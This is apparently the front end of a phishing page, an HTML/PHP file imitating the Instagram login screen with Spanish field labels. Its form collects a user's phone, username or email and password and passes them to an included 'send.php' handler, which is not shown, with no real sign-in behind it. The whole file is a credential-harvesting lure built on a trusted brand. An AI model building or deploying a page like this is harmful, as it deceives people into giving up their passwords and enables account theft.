<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/jpg" href="imagenes/LogoIcon.png">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="style.css">
</head>
<body>

<form method="post" autocomplete="off" >
        <h2><img src="imagenes/Instagram-Logo-PNG.png" width="220px" alt=""></h2>
        <div class="input-group">

        <div class="input-container">
            <input type="text" name="name" placeholder="Télefono, usuario o correo electrónico">

        </div>

        <div class="input-container">
            <input type="password" name="password" placeholder="Contraseña">

        </div>

        <a href="#">¿Olvidaste tu contraseña?</a>
        <input type="submit" name="send" class="btn" value="Iniciar sesión">

        </div>
    </form>

    <?php
        include("send.php");
    ?>
    
</body>
</html>